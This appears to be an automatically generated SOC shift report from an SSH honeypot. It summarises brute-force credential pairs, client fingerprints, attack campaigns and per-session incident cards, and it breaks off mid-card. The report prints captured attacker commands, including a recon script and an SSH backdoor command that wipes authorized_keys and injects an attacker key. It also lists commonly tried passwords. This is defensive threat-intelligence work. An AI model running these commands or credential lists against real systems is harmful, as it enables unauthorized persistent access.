# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-08 |
| **Generated At** | 2026-08-08T05:01:45Z |
| **Shift Time** | 05:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **259** |
| Confirmed Threats | **220** |
| False Positives Filtered | **39** (15.1%) |
| Unique Attacker IPs | **98** |
| Countries of Origin | **35** |
| High Severity Cases | **150** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **109** |
| Malware Samples Analyzed | **3** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **171** |
| Unique Credential Pairs | **116** |
| Unique Usernames | **41** |
| Unique Passwords | **95** |
| Successful Auth Pairs | **156** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 85 |
| `admin` | 8 |
| `config` | 8 |
| `unknown` | 6 |
| `345gs5662d34` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `12345678` | 6 |
| `p@ssw0rd` | 6 |
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `admin` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `support` | `support` | 4 |
| `centos` | `p@ssw0rd` | 4 |
| `unknown` | `abc123` | 4 |
| `root` | `webadmin` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `trader` | `trader123` | `45.148.10.240` | 2026-08-08T02:55:05 |
| `trader` | `123456` | `45.148.10.240` | 2026-08-08T02:56:53 |
| `root` | `rootpasswd` | `122.160.142.194` | 2026-08-08T02:57:34 |
| `trader` | `12345678` | `45.148.10.240` | 2026-08-08T02:58:38 |
| `trading` | `trading@123` | `45.148.10.240` | 2026-08-08T03:00:22 |
| `root` | `root@123` | `45.148.10.240` | 2026-08-08T03:02:08 |
| `shardeum` | `shardeum` | `45.148.10.240` | 2026-08-08T03:03:55 |
| `root` | `admin@123` | `45.148.10.240` | 2026-08-08T03:05:36 |
| `unknown` | `unknown2000` | `187.8.3.230` | 2026-08-08T03:05:36 |
| `unknown` | `unknown2000` | `83.239.84.130` | 2026-08-08T03:05:43 |
| `root` | `solana` | `45.148.10.240` | 2026-08-08T03:07:18 |
| `root` | `webadmin` | `117.248.201.39` | 2026-08-08T03:08:04 |
| `root` | `webadmin` | `111.70.32.8` | 2026-08-08T03:08:12 |
| `root` | `webadmin` | `186.239.41.74` | 2026-08-08T03:08:17 |
| `root` | `validator` | `45.148.10.240` | 2026-08-08T03:09:06 |
| `firedancer` | `firedancer` | `45.148.10.240` | 2026-08-08T03:10:53 |
| `root` | `p@ssw0rd` | `194.85.69.22` | 2026-08-08T03:11:25 |
| `root` | `p@ssw0rd` | `220.80.223.144` | 2026-08-08T03:11:38 |
| `blockchain` | `blockchain` | `45.148.10.240` | 2026-08-08T03:12:35 |
| `www-data` | `www-data` | `45.148.10.240` | 2026-08-08T03:14:20 |
| `root` | `123.321` | `182.52.72.189` | 2026-08-08T03:15:24 |
| `support` | `support` | `176.53.159.196` | 2026-08-08T03:15:45 |
| `user` | `1qq2w3e4r5t` | `45.148.10.240` | 2026-08-08T03:16:08 |
| `pi` | `toor` | `49.124.149.214` | 2026-08-08T03:16:47 |
| `pi` | `toor` | `81.237.155.113` | 2026-08-08T03:16:58 |
| `user` | `11q2w3e4r5t` | `45.148.10.240` | 2026-08-08T03:17:52 |
| `root` | `1qq2w3e4r5t` | `45.148.10.240` | 2026-08-08T03:19:31 |
| `elround` | `elround` | `45.148.10.240` | 2026-08-08T03:21:18 |
| `elrond` | `elrond` | `45.148.10.240` | 2026-08-08T03:23:05 |
| `root` | `123456a` | `10.0.0.73` | 2026-08-08T03:23:40 |
| `admin` | `admin1` | `45.148.10.240` | 2026-08-08T03:24:49 |
| `root` | `root1` | `45.148.10.240` | 2026-08-08T03:26:34 |
| `user` | `user1` | `45.148.10.240` | 2026-08-08T03:28:24 |
| `user` | `1` | `45.148.10.240` | 2026-08-08T03:30:09 |
| `mantenimiento` | `mantenimiento` | `50.84.211.204` | 2026-08-08T03:31:07 |
| `345gs5662d34` | `345gs5662d34` | `50.84.211.204` | 2026-08-08T03:31:08 |
| `mantenimiento` | `3245gs5662d34` | `50.84.211.204` | 2026-08-08T03:31:09 |
| `config` | `config2009` | `178.178.194.134` | 2026-08-08T03:31:32 |
| `config` | `config2009` | `61.145.181.7` | 2026-08-08T03:31:41 |
| `miner` | `mmpOS` | `45.148.10.240` | 2026-08-08T03:31:49 |
| `guest123` | `123456` | `119.18.52.5` | 2026-08-08T03:33:14 |
| `345gs5662d34` | `345gs5662d34` | `119.18.52.5` | 2026-08-08T03:33:18 |
| `guest123` | `3245gs5662d34` | `119.18.52.5` | 2026-08-08T03:33:20 |
| `root` | `admin` | `45.148.10.240` | 2026-08-08T03:33:34 |
| `sammy` | `1` | `112.120.171.95` | 2026-08-08T03:33:44 |
| `345gs5662d34` | `345gs5662d34` | `112.120.171.95` | 2026-08-08T03:33:48 |
| `sammy` | `3245gs5662d34` | `112.120.171.95` | 2026-08-08T03:33:49 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-08T03:34:01 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-08T03:34:01 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-08T03:35:13 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-08T03:35:14 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-08T03:35:16 |
| `git` | `git` | `45.148.10.240` | 2026-08-08T03:35:23 |
| `root` | `Paris2024` | `51.75.161.33` | 2026-08-08T03:35:38 |
| `345gs5662d34` | `345gs5662d34` | `51.75.161.33` | 2026-08-08T03:35:40 |
| `root` | `3245gs5662d34` | `51.75.161.33` | 2026-08-08T03:35:41 |
| `admin` | `admin` | `94.154.43.210` | 2026-08-08T03:36:15 |
| `root` | `xc3511` | `94.154.43.210` | 2026-08-08T03:36:17 |
| `root` | `P@ssw0rd11` | `209.38.121.186` | 2026-08-08T03:36:18 |
| `345gs5662d34` | `345gs5662d34` | `209.38.121.186` | 2026-08-08T03:36:22 |
| `root` | `3245gs5662d34` | `209.38.121.186` | 2026-08-08T03:36:24 |
| `root` | `blockchain1!` | `45.148.10.240` | 2026-08-08T03:37:08 |
| `admin` | `blockchain1!` | `45.148.10.240` | 2026-08-08T03:38:54 |
| `support` | `support` | `10.0.0.73` | 2026-08-08T03:39:23 |
| `ubuntu` | `blockchain1!` | `45.148.10.240` | 2026-08-08T03:40:44 |
| `ari` | `ari` | `45.148.10.240` | 2026-08-08T03:42:33 |
| `sedu` | `sedu` | `45.148.10.240` | 2026-08-08T03:44:16 |
| `solana123` | `solana123` | `45.148.10.240` | 2026-08-08T03:46:00 |
| `sol123` | `sol123` | `45.148.10.240` | 2026-08-08T03:47:49 |
| `ubnt` | `password` | `10.0.0.73` | 2026-08-08T03:48:10 |
| `sol` | `sol123` | `45.148.10.240` | 2026-08-08T03:49:34 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-08T03:50:35 |
| `centos` | `p@ssw0rd` | `92.255.196.185` | 2026-08-08T03:50:58 |
| `centos` | `p@ssw0rd` | `14.54.22.11` | 2026-08-08T03:51:11 |
| `sol` | `1234` | `45.148.10.240` | 2026-08-08T03:51:17 |
| `x` | `x` | `45.154.244.193` | 2026-08-08T03:53:02 |
| `binance` | `binance` | `45.148.10.240` | 2026-08-08T03:53:06 |
| `root` | `---fuck_you----` | `183.238.41.121` | 2026-08-08T03:53:21 |
| `config` | `12345678` | `61.2.44.54` | 2026-08-08T03:54:28 |
| `config` | `12345678` | `10.0.0.73` | 2026-08-08T03:54:41 |
| `okx` | `okx` | `45.148.10.240` | 2026-08-08T03:54:56 |
| `bot` | `bot` | `45.148.10.240` | 2026-08-08T03:56:42 |
| `telegram` | `telegram` | `45.148.10.240` | 2026-08-08T03:58:27 |
| `jito` | `jito` | `45.148.10.240` | 2026-08-08T04:00:17 |
| `firedancer` | `firedancer1!` | `45.148.10.240` | 2026-08-08T04:02:03 |
| `centos` | `p@ssw0rd` | `10.0.0.73` | 2026-08-08T04:02:43 |
| `root` | `!root` | `92.118.39.77` | 2026-08-08T04:02:57 |
| `root` | `firedancer` | `45.148.10.240` | 2026-08-08T04:03:47 |
| `root` | `111111` | `92.118.39.77` | 2026-08-08T04:04:55 |
| `bitcoin` | `bitcoin` | `45.148.10.240` | 2026-08-08T04:05:35 |
| `root` | `123123` | `92.118.39.77` | 2026-08-08T04:06:53 |
| `pool` | `pool` | `45.148.10.240` | 2026-08-08T04:07:26 |
| `root` | `1234` | `92.118.39.77` | 2026-08-08T04:08:49 |
| `miner` | `miner` | `45.148.10.240` | 2026-08-08T04:09:13 |
| `root` | `12345` | `92.118.39.77` | 2026-08-08T04:10:45 |
| `ibkr` | `ibkr` | `45.148.10.240` | 2026-08-08T04:11:00 |
| `ibkrpro` | `ibkrpro` | `45.148.10.240` | 2026-08-08T04:12:51 |
| `blank` | `blank2014` | `111.70.10.15` | 2026-08-08T04:14:10 |
| `root` | `12345678` | `92.118.39.77` | 2026-08-08T04:14:25 |
| `root` | `ibkr` | `45.148.10.240` | 2026-08-08T04:14:40 |
| `root` | `123456789` | `92.118.39.77` | 2026-08-08T04:16:13 |
| `root` | `broker` | `45.148.10.240` | 2026-08-08T04:16:24 |
| `config` | `11111111` | `196.189.59.226` | 2026-08-08T04:16:39 |
| `config` | `11111111` | `210.4.68.72` | 2026-08-08T04:16:41 |
| `config` | `11111111` | `112.27.129.78` | 2026-08-08T04:16:50 |
| `blank` | `blank2014` | `10.0.0.73` | 2026-08-08T04:17:29 |
| `root` | `P@ssw0rd` | `92.118.39.77` | 2026-08-08T04:18:03 |
| `root` | `Password1` | `92.118.39.77` | 2026-08-08T04:19:53 |
| `root` | `Root123` | `92.118.39.77` | 2026-08-08T04:21:46 |
| `root` | `password` | `45.148.10.240` | 2026-08-08T04:23:38 |
| `root` | `admin` | `92.118.39.77` | 2026-08-08T04:23:40 |
| `default` | `Default2010` | `223.99.212.58` | 2026-08-08T04:23:54 |
| `default` | `Default2010` | `71.229.1.186` | 2026-08-08T04:24:02 |
| `admin` | `windows` | `213.33.204.130` | 2026-08-08T04:25:23 |
| `root` | `admin123` | `92.118.39.77` | 2026-08-08T04:25:33 |
| `root` | `1234` | `45.148.10.240` | 2026-08-08T04:25:34 |
| `admin` | `windows` | `62.220.104.155` | 2026-08-08T04:25:36 |
| `root` | `admin123` | `45.148.10.240` | 2026-08-08T04:27:29 |
| `root` | `alpine` | `92.118.39.77` | 2026-08-08T04:27:29 |
| `root` | `toor` | `45.148.10.240` | 2026-08-08T04:29:19 |
| `root` | `changeme` | `92.118.39.77` | 2026-08-08T04:29:25 |
| `root` | `root123` | `45.148.10.240` | 2026-08-08T04:31:11 |
| `root` | `default` | `92.118.39.77` | 2026-08-08T04:31:16 |
| `root` | `Admin@1234` | `10.0.0.73` | 2026-08-08T04:32:06 |
| `root` | `12345678` | `45.148.10.240` | 2026-08-08T04:33:02 |
| `root` | `letmein` | `92.118.39.77` | 2026-08-08T04:33:09 |
| `root` | `1` | `45.148.10.240` | 2026-08-08T04:34:47 |
| `root` | `passw0rd` | `92.118.39.77` | 2026-08-08T04:35:01 |
| `root` | `12345` | `45.148.10.240` | 2026-08-08T04:36:34 |
| `unknown` | `abc123` | `2.55.74.30` | 2026-08-08T04:36:53 |
| `root` | `password` | `92.118.39.77` | 2026-08-08T04:36:56 |
| `unknown` | `abc123` | `72.24.210.58` | 2026-08-08T04:37:04 |
| `admin` | `windows` | `10.0.0.73` | 2026-08-08T04:37:10 |
| `root` | `abcd1234` | `45.148.10.240` | 2026-08-08T04:38:25 |
| `root` | `qwerty` | `92.118.39.77` | 2026-08-08T04:38:52 |
| `unknown` | `abc123` | `155.212.17.174` | 2026-08-08T04:40:01 |
| `unknown` | `abc123` | `65.20.199.149` | 2026-08-08T04:40:12 |
| `root` | `default` | `45.148.10.240` | 2026-08-08T04:40:18 |
| `root` | `r00t` | `92.118.39.77` | 2026-08-08T04:40:50 |
| `root` | `1qaz@WSX` | `45.148.10.240` | 2026-08-08T04:42:08 |
| `root` | `test` | `45.148.10.240` | 2026-08-08T04:44:05 |
| `root` | `root123` | `92.118.39.77` | 2026-08-08T04:44:49 |
| `root` | `3381` | `159.223.93.39` | 2026-08-08T04:45:55 |
| `345gs5662d34` | `345gs5662d34` | `159.223.93.39` | 2026-08-08T04:45:59 |
| `root` | `abc123` | `45.148.10.240` | 2026-08-08T04:46:01 |
| `root` | `3245gs5662d34` | `159.223.93.39` | 2026-08-08T04:46:02 |
| `root` | `root@123` | `92.118.39.77` | 2026-08-08T04:46:47 |
| `root` | `111111` | `45.148.10.240` | 2026-08-08T04:47:51 |
| `root` | `rootme` | `92.118.39.77` | 2026-08-08T04:48:42 |
| `root` | `pass` | `45.148.10.240` | 2026-08-08T04:49:40 |
| `root` | `system` | `92.118.39.77` | 2026-08-08T04:50:33 |
| `root` | `Admin@1234` | `155.212.17.174` | 2026-08-08T04:51:01 |
| `root` | `123` | `45.148.10.240` | 2026-08-08T04:51:33 |
| `root` | `toor` | `92.118.39.77` | 2026-08-08T04:52:26 |
| `root` | `qwerty` | `45.148.10.240` | 2026-08-08T04:53:22 |
| `root` | `welcome` | `92.118.39.77` | 2026-08-08T04:54:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **259** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 100 |
| OpenSSH | 29 |
| libssh | 27 |
| Paramiko (Python) | 6 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 67 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 29 | 28 |
| `2ec37a7cc8da...` | Mirai/variant | 28 | 1 |
| `f555226df196...` | Mirai/variant | 18 | 6 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 67 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 29 | 28 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 28 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 18 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 5 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 26 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
uname -m
```
```
cat /proc/cpuinfo
```
```
/bin/busybox TEST
```
```
cat /proc
```
Source IPs: `94.154.43.210`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.120.171.95`, `51.75.161.33`, `159.223.93.39`, `119.18.52.5`, `209.38.121.186`, `50.84.211.204`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **98** |
| Unique ASNs | **67** |
| High-Risk ASNs | **50** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS48721` | Flyservers S.A. | 3 | HIGH |
| `AS28343` | UNIFIQUE TELECOMUNICACOES S/A | 3 | LOW |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS3301` | Telia Company AB | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (149)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4467cd3e110b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:55 |
| **Last Seen** | 2026-08-08 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:55:05` | `cowrie.session.connect` |
| `2026-08-08 02:55:05` | `cowrie.client.version` |
| `2026-08-08 02:55:05` | `cowrie.client.kex` |
| `2026-08-08 02:55:05` | `cowrie.login.success` |
| `2026-08-08 02:55:06` | `cowrie.session.params` |
| `2026-08-08 02:55:06` | `cowrie.command.input` |
| `2026-08-08 02:55:06` | `cowrie.log.closed` |
| `2026-08-08 02:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e0ef6aab36e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:56 |
| **Last Seen** | 2026-08-08 02:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:56:53` | `cowrie.session.connect` |
| `2026-08-08 02:56:53` | `cowrie.client.version` |
| `2026-08-08 02:56:53` | `cowrie.client.kex` |
| `2026-08-08 02:56:53` | `cowrie.login.success` |
| `2026-08-08 02:56:54` | `cowrie.session.params` |
| `2026-08-08 02:56:54` | `cowrie.command.input` |
| `2026-08-08 02:56:54` | `cowrie.log.closed` |
| `2026-08-08 02:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a55d6f0cae0

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-08-08 02:57 |
| **Last Seen** | 2026-08-08 02:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:57:31` | `cowrie.session.connect` |
| `2026-08-08 02:57:32` | `cowrie.client.version` |
| `2026-08-08 02:57:32` | `cowrie.client.kex` |
| `2026-08-08 02:57:34` | `cowrie.login.success` |
| `2026-08-08 02:57:35` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fdd294ae39a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:58 |
| **Last Seen** | 2026-08-08 02:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:58:38` | `cowrie.session.connect` |
| `2026-08-08 02:58:38` | `cowrie.client.version` |
| `2026-08-08 02:58:38` | `cowrie.client.kex` |
| `2026-08-08 02:58:38` | `cowrie.login.success` |
| `2026-08-08 02:58:39` | `cowrie.session.params` |
| `2026-08-08 02:58:39` | `cowrie.command.input` |
| `2026-08-08 02:58:39` | `cowrie.log.closed` |
| `2026-08-08 02:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-784124565c2b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:00 |
| **Last Seen** | 2026-08-08 03:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:00:21` | `cowrie.session.connect` |
| `2026-08-08 03:00:21` | `cowrie.client.version` |
| `2026-08-08 03:00:21` | `cowrie.client.kex` |
| `2026-08-08 03:00:22` | `cowrie.login.success` |
| `2026-08-08 03:00:22` | `cowrie.session.params` |
| `2026-08-08 03:00:22` | `cowrie.command.input` |
| `2026-08-08 03:00:23` | `cowrie.log.closed` |
| `2026-08-08 03:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5644c806c9b6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:02 |
| **Last Seen** | 2026-08-08 03:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:02:08` | `cowrie.session.connect` |
| `2026-08-08 03:02:08` | `cowrie.client.version` |
| `2026-08-08 03:02:08` | `cowrie.client.kex` |
| `2026-08-08 03:02:08` | `cowrie.login.success` |
| `2026-08-08 03:02:09` | `cowrie.session.params` |
| `2026-08-08 03:02:09` | `cowrie.command.input` |
| `2026-08-08 03:02:09` | `cowrie.log.closed` |
| `2026-08-08 03:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c7f8f8207b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:03 |
| **Last Seen** | 2026-08-08 03:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:03:55` | `cowrie.session.connect` |
| `2026-08-08 03:03:55` | `cowrie.client.version` |
| `2026-08-08 03:03:55` | `cowrie.client.kex` |
| `2026-08-08 03:03:55` | `cowrie.login.success` |
| `2026-08-08 03:03:56` | `cowrie.session.params` |
| `2026-08-08 03:03:56` | `cowrie.command.input` |
| `2026-08-08 03:03:56` | `cowrie.log.closed` |
| `2026-08-08 03:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06456ac9c353

| Field | Detail |
|---|---|
| **Source IP** | `187.8.3[.]230` |
| **First Seen** | 2026-08-08 03:05 |
| **Last Seen** | 2026-08-08 03:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:05:34` | `cowrie.session.connect` |
| `2026-08-08 03:05:34` | `cowrie.client.version` |
| `2026-08-08 03:05:34` | `cowrie.client.kex` |
| `2026-08-08 03:05:36` | `cowrie.login.success` |
| `2026-08-08 03:05:37` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.3[.]230` to AbuseIPDB if not already reported
- [ ] Block `187.8.3[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-196202cc746a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:05 |
| **Last Seen** | 2026-08-08 03:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:05:36` | `cowrie.session.connect` |
| `2026-08-08 03:05:36` | `cowrie.client.version` |
| `2026-08-08 03:05:36` | `cowrie.client.kex` |
| `2026-08-08 03:05:36` | `cowrie.login.success` |
| `2026-08-08 03:05:37` | `cowrie.session.params` |
| `2026-08-08 03:05:37` | `cowrie.command.input` |
| `2026-08-08 03:05:37` | `cowrie.log.closed` |
| `2026-08-08 03:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ec431478da

| Field | Detail |
|---|---|
| **Source IP** | `83.239.84[.]130` |
| **First Seen** | 2026-08-08 03:05 |
